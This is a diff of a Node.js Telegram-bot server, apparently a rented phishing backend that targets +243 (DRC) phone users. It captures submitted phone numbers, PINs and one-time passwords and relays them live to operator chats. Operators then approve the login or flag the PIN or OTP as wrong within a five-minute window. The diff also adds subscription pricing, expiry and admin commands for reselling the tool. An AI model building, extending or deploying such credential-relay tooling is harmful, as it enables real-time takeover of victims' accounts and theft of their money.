@@ -1,1028 +1,245 @@
-// server.js - DRC Multi-User System with Webhook Support (No Polling)
-// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
-// Uses Telegram webhooks instead of long-polling.
-// Benefits on Render:
-//   • Zero 409 conflicts — no competing getUpdates connections
-//   • Zero reconnect logic — Telegram pushes to us, we never pull
-//   • Zero polling errors in logs
-//   • Lower latency (<100ms vs ~1s for polling round-trip)
-//   • Lower CPU/memory — no persistent outbound connection
-//
-// Required env var:
-//   WEBHOOK_URL=https://your-service.onrender.com
-//   (the /telegram/:secret route is registered automatically per bot)
-
-const express = require('express');
-const cors = require('cors');
+// drc-server.js — DRC +243 Login→OTP (single-bot webhook mode)
+// Standard template: one bot, two-letter IDs, MongoDB, admin commands, expiry, SIGTERM fix
+'use strict';
+const express     = require('express');
+const cors        = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
-const crypto = require('crypto');
 require('dotenv').config();
 
-const app = express();
-const PORT = process.env.PORT || 3001;
+const { connectDB, markShutdown } = require('./db');
+const DrcUser                     = require('./models/drcuser');
+const DrcState                    = require('./models/drcstate');
 
-// Raw body needed for webhook signature verification — must come before json()
-app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
+const app  = express();
+const PORT = process.env.PORT || 3001;
 app.use(cors());
 app.use(express.json({ limit: '10kb' }));
 
-// ============================================
-// CONFIGURATION
-// ============================================
-const CONFIG = Object.freeze({
-  CACHE_DURATION: 5000,
-  APPROVAL_TIMEOUT: 5 * 60 * 1000,
-  CLEANUP_INTERVAL: 60000,
-  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
-  REQUEST_TIMEOUT: 30000,
-  MAX_NOTIFICATION_SIZE: 4096,
-  TG_CHAT_INTERVAL: 1050,  // ms — Telegram: 1 msg/s per chat
-  SSE_HEARTBEAT: 20000,
-  WEBHOOK_URL: (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
+const ts  = () => new Date().toISOString();
+const log = { info: (...a) => console.log(`[INFO]  ${ts()} -`, ...a), error: (...a) => console.error(`[ERROR] ${ts()} -`, ...a), warn: (...a) => console.warn(`[WARN]  ${ts()} -`, ...a), debug: (...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} -`, ...a) };
+
+const EXPIRY_DAYS = parseInt(process.env.EXPIRY_DAYS) || 30;
+const PAYMENT_AMOUNT = process.env.PAYMENT_AMOUNT || '500';
+const RENEWAL_AMOUNT = process.env.RENEWAL_AMOUNT || '300';
+const PAYMENT_DETAILS = process.env.PAYMENT_DETAILS || 'contact admin for payment details';
+const ADMIN_CHAT_ID = (process.env.ADMIN_CHAT_ID || '').trim();
+const WHATSAPP_NUMBER = (process.env.WHATSAPP_NUMBER || '').trim();
+const ROOT_LINK = (process.env.ROOT_LINK || '').replace(/\/$/, '');
+const WEBHOOK_URL = (process.env.WEBHOOK_URL || '').replace(/\/$/, '');
+const isAdmin = (chatId) => !!ADMIN_CHAT_ID && String(chatId).trim() === ADMIN_CHAT_ID;
+
+const CFG = Object.freeze({
+  APPROVAL_TIMEOUT: 5 * 60_000, CLEANUP_INTERVAL: 15_000, EXPIRY_CHECK_INTERVAL: 60 * 60 * 1000,
+  WARNING_DAYS: 3, MAX_MSG_SIZE: 4096, SEND_RETRIES: 3, SEND_RETRY_DELAY: 1500,
+  DUPE_TTL: 5000, TG_CHAT_INTERVAL: 1050, READ_TTL: 30_000,
+  BOT_INIT_DELAY: 1000, MAX_RESTART: 5, DEDUP_SIZE: 2000,
 });
 
-// ============================================
-// LOGGER
-// ============================================
-const ts = () => new Date().toISOString();
-const logger = {
-  info: (msg, ...args) => console.log(`[INFO]  ${ts()} ${msg}`, ...args),
-  warn: (msg, ...args) => console.warn(`[WARN]  ${ts()} ${msg}`, ...args),
-  error: (msg, ...args) => console.error(`[ERROR] ${ts()} ${msg}`, ...args),
-  debug: (msg, ...args) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${msg}`, ...args),
-};
-
-// ============================================
-// UTILITY FUNCTIONS
-// ============================================
+// ── Helpers ──
 const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
-const trunc = (s, n = CONFIG.MAX_NOTIFICATION_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
+const trunc = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
+// ── DRC +243 phone normalisation ──
 const RE_NONDIGIT = /\D/g;
-
 const _phoneCache = new Map();
 const normalise = (raw) => {
   if (!raw || typeof raw !== 'string') return '';
-  const hit = _phoneCache.get(raw);
-  if (hit) return hit;
+  const hit = _phoneCache.get(raw); if (hit) return hit;
   let c = raw.replace(RE_NONDIGIT, '');
   if (c.startsWith('243')) c = c.slice(3);
   if (c.startsWith('0')) c = c.slice(1);
   if (c.length > 9) c = c.slice(-9);
   const result = `+243${c}`;
   if (_phoneCache.size > 5000) _phoneCache.clear();
-  _phoneCache.set(raw, result);
-  return result;
+  _phoneCache.set(raw, result); return result;
 };
+const fmtPhone = (raw) => { const full = normalise(raw); return { cc: '+243', num: full.slice(4), full }; };
 
-const formatPhoneNumber = (phoneNumber) => {
-  try {
-    let cleaned = phoneNumber.replace(/\D/g, '');
-    if (cleaned.startsWith('243')) {
-      const countryCode = '+243';
-      let number = cleaned.substring(3);
-      if (number.length === 10 && number.startsWith('0')) {
-        number = number.substring(1);
-      }
-      if (number.length > 9) {
-        number = number.substring(number.length - 9);
-      }
-      return { countryCode, number, formatted: `${countryCode}${number}` };
-    }
-    if (cleaned.length === 10 && cleaned.startsWith('0')) {
-      cleaned = cleaned.substring(1);
-    }
-    if (cleaned.length > 9) {
-      cleaned = cleaned.substring(cleaned.length - 9);
-    }
-    return { countryCode: '+243', number: cleaned, formatted: `+243${cleaned}` };
-  } catch (error) {
-    logger.error('Error formatting phone number:', error.message);
-    return { countryCode: '+243', number: phoneNumber, formatted: phoneNumber };
-  }
-};
+// ── Validators ──
+const vPhone = (p) => { if (!p || typeof p !== 'string') return 'Phone must be a string'; const n = p.replace(RE_NONDIGIT, ''); return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null; };
+const vPin = (p) => (!p || typeof p !== 'string') ? 'PIN required' : (p.length < 4 || p.length > 8 || !/^\d+$/.test(p)) ? 'PIN must be 4-8 digits' : null;
+const vOtp = (o) => (!o || typeof o !== 'string') ? 'OTP required' : (o.length < 4 || o.length > 8 || !/^\d+$/.test(o)) ? 'OTP must be 4-8 digits' : null;
 
-// ============================================
-// VALIDATORS
-// ============================================
-const validatePhoneNumber = (phoneNumber) => {
-  if (!phoneNumber || typeof phoneNumber !== 'string') {
-    return { valid: false, error: 'Phone number must be a string' };
-  }
-  const cleaned = phoneNumber.replace(/\D/g, '');
-  if (cleaned.length < 9 || cleaned.length > 15) {
-    return { valid: false, error: 'Invalid phone number length' };
-  }
-  return { valid: true, cleaned };
-};
+// ── DupeCache / TgQueue ──
+class DupeCache { constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; } seen(key) { if (this._m.has(key)) return true; const h = setTimeout(() => this._m.delete(key), this._ttl); if (h.unref) h.unref(); this._m.set(key, h); return false; } clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); } }
+class TgQueue { constructor(interval = CFG.TG_CHAT_INTERVAL) { this._q = []; this._running = false; this._interval = interval; this._last = 0; } send(fn) { return new Promise((res, rej) => { this._q.push({ fn, res, rej }); if (!this._running) this._drain(); }); } async _drain() { this._running = true; while (this._q.length) { const gap = this._interval - (Date.now() - this._last); if (gap > 0) await sleep(gap); const { fn, res, rej } = this._q.shift(); this._last = Date.now(); try { res(await fn()); } catch (e) { rej(e); } } this._running = false; } flush(r = 'flushed') { while (this._q.length) this._q.shift().reject(new Error(r)); } }
 
-const validatePin = (pin) => {
-  if (!pin || typeof pin !== 'string') {
-    return { valid: false, error: 'PIN must be a string' };
-  }
-  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin)) {
-    return { valid: false, error: 'PIN must be 4-8 digits' };
-  }
-  return { valid: true };
-};
+// ── ID/Date ──
+const encodeId = (n) => { n--; return String.fromCharCode(97 + Math.floor(n / 26)) + String.fromCharCode(97 + (n % 26)); };
+const decodeId = (id) => { if (!/^[a-z]{2}$/.test(id)) return null; return (id.charCodeAt(0) - 97) * 26 + (id.charCodeAt(1) - 97) + 1; };
+const nextAvailableId = () => { for (let n = 1; n <= 676; n++) { const id = encodeId(n); if (!users.has(id)) return id; } return null; };
+const addDays = (d, days) => { const r = new Date(d); r.setDate(r.getDate() + days); return r.toISOString(); };
+const daysUntil = (iso) => Math.ceil((new Date(iso) - Date.now()) / 864e5);
+const isExpired = (iso) => iso && new Date(iso) <= new Date();
+const fmtDate = (iso) => iso ? new Date(iso).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) : 'Never';
 
-const validateOtp = (otp) => {
-  if (!otp || typeof otp !== 'string') {
-    return { valid: false, error: 'OTP must be a string' };
-  }
-  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp)) {
-    return { valid: false, error: 'OTP must be 4-8 digits' };
-  }
-  return { valid: true };
-};
+// ── Message formatters ──
+const fmtLogin = (user, { phone, pin, time }) => { const { cc, num } = fmtPhone(phone); return `📱 <b>${sanitize(user.name)} — LOGIN</b>\n\n🆕 NEW USER\n🌍 <b>Country:</b> <code>${cc}</code>\n📞 <b>Number:</b> <code>${num}</code>\n🔐 <b>PIN:</b> <code>${sanitize(pin)}</code>\n⏰ <b>Time:</b> ${new Date(time).toLocaleString()}\n\n📱 Will require OTP verification\n\n━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`; };
+const fmtOtp = (user, { phone, otp, time }) => { const { cc, num } = fmtPhone(phone); return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>\n\n🆕 VERIFICATION NEEDED\n🌍 <b>Country:</b> <code>${cc}</code>\n📞 <b>Number:</b> <code>${num}</code>\n🔑 <b>OTP:</b> <code>${sanitize(otp)}</code>\n⏰ <b>Time:</b> ${new Date(time).toLocaleString()}\n\n━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`; };
 
-// ============================================
-// PER-USER TELEGRAM SEND QUEUE
-// ============================================
-class TgQueue {
-  constructor(interval = CONFIG.TG_CHAT_INTERVAL) {
-    this._q = [];
-    this._running = false;
-    this._interval = interval;
-    this._last = 0;
-  }
-  send(fn) {
-    return new Promise((resolve, reject) => {
-      this._q.push({ fn, resolve, reject });
-      if (!this._running) this._drain();
-    });
-  }
-  async _drain() {
-    this._running = true;
-    while (this._q.length) {
-      const gap = this._interval - (Date.now() - this._last);
-      if (gap > 0) await sleep(gap);
-      const { fn, resolve, reject } = this._q.shift();
-      this._last = Date.now();
-      try { resolve(await fn()); }
-      catch (e) { reject(e); }
-    }
-    this._running = false;
-  }
-  flush(reason = 'queue flushed') {
-    while (this._q.length) this._q.shift().reject(new Error(reason));
-  }
-}
+const CB_SEP = '|';
+const mkCb = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
+const parseCb = (d) => { const p = d.split(CB_SEP); return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null; };
 
-// ============================================
-// DUPLICATE CACHE
-// ============================================
-class DupeCache {
-  constructor(ttl = CONFIG.CACHE_DURATION) {
-    this._m = new Map();
-    this._ttl = ttl;
-  }
-  seen(key) {
-    if (this._m.has(key)) return true;
-    const h = setTimeout(() => this._m.delete(key), this._ttl);
-    if (h.unref) h.unref();
-    this._m.set(key, h);
-    return false;
-  }
-  clear() {
-    for (const h of this._m.values()) clearTimeout(h);
-    this._m.clear();
-  }
-}
-
-// ============================================
-// VERSION-SAFE TELEGRAM WEBHOOK HELPERS
-// ============================================
-const https = require('https');
-
-const _rawTgCall = (token, method, body = {}) => new Promise((resolve, reject) => {
-  const data = JSON.stringify(body);
-  const req = https.request({
-    hostname: 'api.telegram.org',
-    path: `/bot${token}/${method}`,
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
-  }, (res) => {
-    let raw = '';
-    res.on('data', c => raw += c);
-    res.on('end', () => {
-      try {
-        const parsed = JSON.parse(raw);
-        if (parsed.ok) resolve(parsed.result);
-        else reject(new Error(`Telegram error: ${parsed.description}`));
-      } catch (e) { reject(e); }
-    });
-  });
-  req.on('error', reject);
-  req.write(data);
-  req.end();
-});
-
-const tgDeleteWebhook = (bot, token) =>
-  (bot.deleteWebhook?.() ?? bot.deleteWebHook?.() ?? _rawTgCall(token, 'deleteWebhook', { drop_pending_updates: true }));
-
-const tgSetWebhook = (bot, token, url, opts = {}) =>
-  (bot.setWebhook?.(url, opts) ?? _rawTgCall(token, 'setWebhook', { url, ...opts }));
-
-const tgGetWebhookInfo = (bot, token) =>
-  (bot.getWebhookInfo?.() ?? _rawTgCall(token, 'getWebhookInfo', {}));
-
-// ============================================
-// BOT MANAGER (WEBHOOK EDITION)
-// ============================================
-class BotManager {
-  constructor(user, linkInsert) {
-    this.user = user;
-    this.linkInsert = linkInsert;
-    this.bot = null;
-    this.ready = false;
-  }
-
-  get _secret() {
-    return crypto.createHash('sha256')
-      .update(`wh:${this.user.botToken}`)
-      .digest('hex')
-      .slice(0, 32);
-  }
-
-  get _path() { return `/telegram/${this._secret}`; }
-
-  async init() {
-    if (!CONFIG.WEBHOOK_URL) {
-      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
-      return;
-    }
-
-    this.bot = new TelegramBot(this.user.botToken, {
-      webHook: false,  // we handle the HTTP route ourselves via Express
-      filepath: false,
-    });
-
-    this._attachCommands();
-
-    const fullUrl = `${CONFIG.WEBHOOK_URL}${this._path}`;
-
-    try {
-      // 1. Clear any stale webhook / polling session
-      await tgDeleteWebhook(this.bot, this.user.botToken).catch(() => {});
-
-      // 2. Register our new webhook
-      await tgSetWebhook(this.bot, this.user.botToken, fullUrl, {
-        allowed_updates: ['message', 'callback_query'],
-        drop_pending_updates: true,
-      });
-
-      // 3. Verify
-      const info = await tgGetWebhookInfo(this.bot, this.user.botToken).catch(() => ({}));
-      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);
-      logger.debug(`${this.user.name}: pending=${info?.pending_update_count ?? '?'}, lastErr=${info?.last_error_message || 'none'}`);
-
-      this.user.healthy = true;
-      this.user.bot = this.bot;
-      this.ready = true;
-    } catch (e) {
-      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
-    }
-  }
-
-  processUpdate(update) {
-    if (!this.bot) return;
-    try {
-      this.bot.processUpdate(update);
-    } catch (e) {
-      logger.error(`${this.user.name}: processUpdate error:`, e.message);
-    }
-  }
-
-  _attachCommands() {
-    const { bot, user, linkInsert } = this;
-
-    bot.onText(/\/start/, async (msg) => {
-      try {
-        await bot.sendMessage(msg.chat.id,
-          `🤖 <b>${sanitize(user.name)} Bot - DRC</b>\n\n` +
-          `I will notify you of all login attempts and OTP verifications.\n\n` +
-          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
-          `<b>Your Link:</b> <code>/api/${linkInsert}/*</code>\n\n` +
-          `Add these to your .env file as:\n` +
-          `<code>USER_LINK_INSERT_${user.id}=${linkInsert}</code>\n` +
-          `<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
-          { parse_mode: 'HTML' });
-      } catch (e) {
-        logger.error('/start:', e.message);
-      }
-    });
-
-    bot.onText(/\/status/, async (msg) => {
-      try {
-        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
-        await bot.sendMessage(msg.chat.id,
-          `✅ <b>${sanitize(user.name)} Bot Active - DRC</b>\n\n` +
-          `📊 Pending logins: ${user.loginNotifications.size}\n` +
-          `📊 Pending OTP: ${user.otpVerifications.size}\n` +
-          `🔗 Endpoint: <code>/api/${linkInsert}/*</code>\n` +
-          `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
-          `📬 Pending updates: ${info?.pending_update_count ?? '?'}\n` +
-          `${info?.last_error_message ? `⚠️ Last webhook error: ${info.last_error_message}` : '✅ No webhook errors'}\n` +
-          `${user.lastErr ? `⚠️ Last send error: ${sanitize(user.lastErr)}` : ''}`,
-          { parse_mode: 'HTML' });
-      } catch (e) {
-        logger.error('/status:', e.message);
-      }
-    });
-
-    bot.on('callback_query', async (q) => {
-      try {
-        await handleCallbackQuery(user, q);
-      } catch (e) {
-        logger.error(`${user.name}: callback error:`, e.message);
-      }
-    });
-  }
-
-  ok() { return this.ready && this.user.healthy; }
-}
-
-// ============================================
-// MESSAGE FORMATTERS
-// ============================================
-const formatLoginMessage = (user, data) => {
-  try {
-    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
-    
-    return `📱 <b>${sanitize(user.name)} - LOGIN ATTEMPT</b>
-
-🆕 <b>NEW USER</b>
-🌍 <b>Country Code:</b> <code>${countryCode}</code>
-📱 <b>Phone Number:</b> <code>${number}</code>
-🔢 <b>PIN:</b> <code>${sanitize(data.pin)}</code>
-⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
-
-📱 <b>Will require OTP verification</b>
-
-━━━━━━━━━━━━━━━━━━━
-
-⚠️ <b>User waiting for approval</b>
-⏱️ <b>Timeout:</b> 5 minutes`;
-  } catch (error) {
-    logger.error(`Error formatting login message for ${user.name}:`, error.message);
-    return `Error formatting message: ${error.message}`;
-  }
-};
-
-const formatOTPMessage = (user, data) => {
-  try {
-    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
-    
-    return `✅ <b>${sanitize(user.name)} - OTP VERIFICATION</b>
-
-🆕 <b>NEW USER - VERIFICATION NEEDED</b>
-🌍 <b>Country Code:</b> <code>${countryCode}</code>
-📱 <b>Phone Number:</b> <code>${number}</code>
-🔐 <b>OTP Code:</b> <code>${sanitize(data.otp)}</code>
-⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
-
-━━━━━━━━━━━━━━━━━━━
-
-⚠️ <b>Verify the credentials:</b>
-⏱️ <b>Timeout:</b> 5 minutes`;
-  } catch (error) {
-    logger.error(`Error formatting OTP message for ${user.name}:`, error.message);
-    return `Error formatting message: ${error.message}`;
-  }
-};
-
-// ============================================
-// CALLBACK DATA HELPERS
-// ============================================
-// Simple underscore format: type_action_phone_secret
-// Easier to parse and more reliable with Telegram
-const mkCb = (type, action, phone, secret) => `${type}_${action}_${phone}_${secret}`;
-const parseCb = (d) => {
-  const parts = d.split('_');
-  if (parts.length < 3) return null;
-  // Last part is secret, second-to-last is phone/action indicator
-  // Format: type_action_rest (where rest could be phone_secret or just action)
-  const type = parts[0];
-  const action = parts[1];
-  const data = parts.slice(2).join('_');
-  return { type, action, data };
-};
-
-// ============================================
-// CALLBACK QUERY HANDLER
-// ============================================
-const _answeredCallbacks = new Set();
-
-async function handleCallbackQuery(user, q) {
-  const { bot } = user;
-  const { data, message: msg, id: qid } = q;
-  const { chat: { id: chatId }, message_id: mid } = msg;
-
-  if (_answeredCallbacks.has(qid)) return;
-  _answeredCallbacks.add(qid);
-  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60 * 1000);
-  if (t.unref) t.unref();
-
-  const edit = (text) =>
-    bot.editMessageText(text, {
-      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
-      reply_markup: { inline_keyboard: [] },
-    }).catch(e => logger.debug('edit skipped:', e.message));
-
-  const answer = (text, alert = false) =>
-    bot.answerCallbackQuery(qid, { text, show_alert: alert })
-      .catch(e => logger.debug('answer skipped:', e.message));
-
-  try {
-    const parts = data.split('_');
-    if (parts.length < 3) {
-      logger.warn(`${user.name}: Bad callback data: ${data}`);
-      await answer('❌ Bad data', true);
-      return;
-    }
-
-    const type = parts[0];
-    const action = parts[1];
-    const dataParts = parts.slice(2);  // Everything after type_action
-    const secret = dataParts[dataParts.length - 1];  // Last part is PIN/OTP
-    const phone = dataParts.slice(0, -1).join('_');  // Everything before last is phone
-    
-    const key = `${phone}-${secret}`;
-    const now = Date.now();
-
-    logger.debug(`${user.name}: Callback - type=${type}, action=${action}, phone=${phone}, secret=${secret}`);
-
-    if (type === 'login') {
-      const rec = user.loginNotifications.get(key);
-      if (!rec) {
-        logger.warn(`${user.name}: Login session not found: ${key}`);
-        await answer('❌ Session not found', true);
-        return;
-      }
-      if (rec.approved || rec.rejected) {
-        await answer('✅ Already processed');
-        return;
-      }
-
-      if (now - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        Object.assign(rec, { approved: false, rejected: true, expired: true });
-        await Promise.all([
-          edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
-          answer('⏰ Session expired', true),
-        ]);
-        return;
-      }
-
-      if (action === 'proceed') {
-        rec.approved = true;
-        logger.info(`${user.name}: Login approved - ${phone}`);
-        await Promise.all([
-          edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n→ OTP step`),
-          answer('✅ Allowed!'),
-        ]);
-      } else if (action === 'invalid') {
-        Object.assign(rec, { rejected: true, rejectionReason: 'invalid' });
-        logger.info(`${user.name}: Login rejected - ${phone}`);
-        await Promise.all([
-          edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
-          answer('❌ Marked invalid'),
-        ]);
-      } else {
-        await answer('❓ Unknown action');
-      }
-      return;
-    }
-
-    if (type === 'otp') {
-      const rec = user.otpVerifications.get(key);
-      if (!rec) {
-        logger.warn(`${user.name}: OTP session not found: ${key}`);
-        await answer('❌ Verification not found', true);
-        return;
-      }
-      if (rec.status !== 'pending') {
-        await answer('✅ Already processed');
-        return;
-      }
-
-      if (now - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        rec.status = 'timeout';
-        logger.info(`${user.name}: OTP timeout - ${phone}`);
-        await Promise.all([
-          edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
-          answer('⏰ Session expired', true),
-        ]);
-        return;
-      }
-
-      if (action === 'correct') {
-        rec.status = 'approved';
-        logger.info(`${user.name}: OTP verified - ${phone}`);
-        await Promise.all([
-          edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n✅ User logged in`),
-          answer('✅ Verified!'),
-        ]);
-      } else if (action === 'wrong') {
-        rec.status = 'rejected';
-        logger.info(`${user.name}: OTP wrong - ${phone}`);
-        await Promise.all([
-          edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
-          answer('❌ Wrong OTP'),
-        ]);
-      } else if (action === 'wrongpin') {
-        rec.status = 'wrong_pin';
-        logger.info(`${user.name}: Wrong PIN - ${phone}`);
-        await Promise.all([
-          edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
-          answer('⚠️ Wrong PIN'),
-        ]);
-      } else {
-        await answer('❓ Unknown action');
-      }
-      return;
-    }
-
-    logger.warn(`${user.name}: Unknown callback type: ${type}`);
-    await answer('❓ Unknown type');
-  } catch (error) {
-    logger.error(`${user.name}: Callback handler error:`, error.message);
-    await answer('❌ Error processing', true).catch(() => {});
-  }
-}
-
-// ============================================
-// SEND TELEGRAM MESSAGE
-// ============================================
-async function sendMsg(user, text, opts = {}) {
-  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
-  return user.tgQueue.send(async () => {
-    try {
-      await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
-      user.lastErr = null;
-      return { ok: true };
-    } catch (e) {
-      user.lastErr = e.message;
-      const s = e.response?.statusCode;
-      logger.error(`sendMsg [${user.name}] attempt:`, s || e.code, e.message);
-      if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
-      if (s === 429) {
-        const wait = Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60000);
-        await sleep(wait);
-        return { ok: false, err: 'Rate limited', retryAfter: wait };
-      }
-      return { ok: false, err: e.message };
-    }
-  });
-}
-
-// ============================================
-// LOAD USERS
-// ============================================
+// ── Users ──
 const users = new Map();
-
-(function loadUsers() {
-  let ok = 0, fail = 0;
-  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
-    const link = process.env[`USER_LINK_INSERT_${i}`];
-    const token = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
-    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
-    const name = process.env[`USER_NAME_${i}`] || `User ${i}`;
-    
-    if (!link || !token || !chatId) continue;
-    if (!/^[a-zA-Z0-9_-]+$/.test(link)) { logger.warn(`User ${i}: bad link`); fail++; continue; }
-    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`); fail++; continue; }
-    if (!/^-?\d+$/.test(chatId)) { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
-    if (users.has(link)) { logger.warn(`Dup link: ${link}`); fail++; continue; }
-    
-    const u = {
-      id: i,
-      name: sanitize(name),
-      linkInsert: link,
-      botToken: token,
-      chatId,
-      bot: null,
-      healthy: false,
-      lastErr: null,
-      loginNotifications: new Map(),
-      otpVerifications: new Map(),
-      processedRequests: new Map(),
-      dupes: new DupeCache(),
-      tgQueue: new TgQueue(),
-    };
-    
-    u.mgr = new BotManager(u, link);
-    users.set(link, u);
-    ok++;
-  }
-  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
-})();
-
-// ============================================
-// WEBHOOK ROUTE REGISTRATION
-// ============================================
-users.forEach((user) => {
-  const path = user.mgr._path;
-  app.post(path, (req, res) => {
-    // Acknowledge immediately — Telegram retries if we don't respond in 5s
-    res.sendStatus(200);
-    
-    // Parse body (raw Buffer from express.raw middleware)
-    let update;
-    try {
-      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
-      update = JSON.parse(body);
-    } catch (e) {
-      logger.error(`${user.name}: webhook body parse error:`, e.message);
-      return;
-    }
-    
-    // Log update type for debugging
-    if (update.callback_query) {
-      logger.debug(`${user.name}: Webhook received callback_query:`, update.callback_query.data);
-    } else if (update.message) {
-      logger.debug(`${user.name}: Webhook received message:`, update.message.text?.slice(0, 50) || '(no text)');
-    } else {
-      logger.debug(`${user.name}: Webhook received update:`, Object.keys(update).join(','));
-    }
-    
-    user.mgr.processUpdate(update);
-  });
-  
-  logger.info(`Registered webhook route: POST ${path} → ${user.name}`);
+const makeUserObj = ({ id, name, chatId, source = 'env', createdAt = null, expiresAt = null }) => ({
+  id, num: decodeId(id), name: sanitize(name), chatId: String(chatId), source, createdAt, expiresAt,
+  expired: expiresAt ? isExpired(expiresAt) : false, warningSent: false,
+  logins: new Map(), otps: new Map(), dupes: new DupeCache(), tgQueue: new TgQueue(), lastErr: null,
 });
 
-// ============================================
-// BOT INITIALIZATION
-// ============================================
-(async () => {
-  if (!CONFIG.WEBHOOK_URL) {
-    logger.error('WEBHOOK_URL env var is not set. Add it to your Render environment variables:');
-    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
-    logger.error('Bots will not receive updates until this is set.');
-  }
-  
-  const arr = [...users.values()];
-  for (let i = 0; i < arr.length; i++) {
-    try {
-      await arr[i].mgr.init();
-    } catch (e) {
-      logger.error(`Init [${arr[i].name}]:`, e.message);
-    }
-    if (i < arr.length - 1) await sleep(500);
-  }
-  logger.info('All bots initialised');
-})();
+const loadEnvUsers = () => { let n = 0; const pat = /^USER_([A-Z]{2})_ID$/; for (const [key, chatId] of Object.entries(process.env)) { const m = key.match(pat); if (!m) continue; const id = m[1].toLowerCase(); const name = process.env[`USER_${m[1]}_NAME`] || `User ${m[1]}`; if (!/^-?\d+$/.test(chatId) || users.has(id)) continue; users.set(id, makeUserObj({ id, name, chatId, source: 'env' })); n++; } log.info(`Loaded ${n} user(s) from env (permanent)`); };
+const loadUsersFromDB = async () => { let n = 0; try { const docs = await DrcUser.find({}).lean(); for (const d of docs) { if (!d.id || !d.chatId || users.has(d.id)) continue; users.set(d.id, makeUserObj({ id: d.id, name: d.name, chatId: d.chatId, source: 'db', createdAt: d.createdAt ? new Date(d.createdAt).toISOString() : null, expiresAt: d.expiresAt ? new Date(d.expiresAt).toISOString() : null })); n++; } log.info(`Loaded ${n} user(s) from MongoDB`); } catch (e) { log.error('DB load:', e.message); } };
+const persistUser = async (id, name, chatId, createdAt, expiresAt) => { try { await DrcUser.findOneAndUpdate({ id }, { id, name, chatId: String(chatId), createdAt, expiresAt, source: 'db' }, { upsert: true, returnDocument: 'after', setDefaultsOnInsert: true }); return true; } catch (e) { return false; } };
+const deleteUserFromDB = async (id) => { try { await DrcUser.deleteOne({ id }); } catch (e) {} };
+const registerUser = async (id, name, chatId) => { const now = new Date().toISOString(), exp = addDays(now, EXPIRY_DAYS); const obj = makeUserObj({ id, name, chatId, source: 'db', createdAt: now, expiresAt: exp }); users.set(id, obj); await persistUser(id, name, chatId, now, exp); sortUsers(); return obj; };
+const renewUser = async (u) => { const b = (u.expiresAt && !isExpired(u.expiresAt)) ? u.expiresAt : new Date().toISOString(); const exp = addDays(b, EXPIRY_DAYS); u.expiresAt = exp; u.expired = false; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, exp); return exp; };
+const sortUsers = () => { const s = new Map([...users.entries()].sort((a, b) => a[1].num - b[1].num)); users.clear(); for (const [k, v] of s) users.set(k, v); };
 
-// ============================================
-// AUTO-CLEANUP
-// ============================================
-setInterval(() => {
-  const now = Date.now();
-  const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
